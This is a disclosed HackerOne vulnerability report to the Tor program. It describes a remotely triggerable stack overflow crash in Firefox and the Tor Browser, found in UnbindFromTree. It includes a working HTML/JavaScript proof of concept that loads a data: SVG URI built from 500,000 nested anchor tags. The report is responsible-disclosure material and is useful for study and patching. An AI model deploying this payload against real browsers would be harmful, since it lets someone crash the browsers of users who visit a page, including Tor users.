---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/stack-overflow
  - env/web
substate: "informative"
weakness: "Stack Overflow"
enriched: true
body: true
date: 2017-10-02
submitted: 2017-08-30T00:34:16.164Z
bounty_usd: null
votes: 1
cve: []
program: "[[programs/torproject|Tor]]"
reporter: "geeknik"
source: "https://hackerone.com/reports/264481"
title: "Stack overflow in UnbindFromTree (browser can be crashed remotely)"
---
# Stack overflow in UnbindFromTree (browser can be crashed remotely)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Tor | **Disclosed:** 2017-10-02

- Report: [https://hackerone.com/reports/264481](https://hackerone.com/reports/264481)
- CWE: Stack Overflow
- Submitted: 2017-08-30T00:34:16.164Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I reported this bug to Mozilla approximately [9 months ago](https://bugzilla.mozilla.org/show_bug.cgi?id=1322307) and all versions of Firefox back to at least ESR45 and including current Nightly 57 builds are still vulnerable to this unpatched flaw. I've tested on Fedora 26, Debian 8, Windows 8 and Windows 10. Mozilla declined to award a bounty. 

Code:
```
<html>
<head></head>
<body>
<script>
function done() {
}

var x = '';
for (i=0; i<500000; ++i)
  x += '<a>';
var uri = 'data:image/svg+xml,' + x;
var i = new Image();
i.src = uri;
</script>
</body>
</html>
```

The caveat to this is that if scripts are disabled on the page where this code is located, the Tor browser won't crash. [This link](https://bugzilla.mozilla.org/attachment.cgi?id=8817075) will probably crash your Firefox. A WinDBG stack trace is located [here](https://bugzilla.mozilla.org/attachment.cgi?id=8817117).

## Timeline

- **Report Filed**
- **Report Informative**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
